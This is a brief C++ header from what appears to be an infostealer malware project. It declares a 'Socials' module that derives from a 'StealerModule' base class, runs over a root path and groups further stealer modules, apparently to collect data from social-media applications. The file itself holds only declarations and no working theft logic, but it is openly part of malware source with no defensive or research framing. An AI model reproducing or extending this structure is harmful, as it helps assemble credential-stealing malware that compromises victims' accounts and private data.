//
// Created by .1qxz on 07.06.2024.
//

#ifndef STEALER_SOCIALS_H
#define STEALER_SOCIALS_H

#include "../../StealerModule.h"

class Socials : public StealerModule {
public:
    Socials();
    void execute(fs::path& root) override;

private:
    std::list<StealerModule*> modules;
};

#endif //STEALER_SOCIALS_H
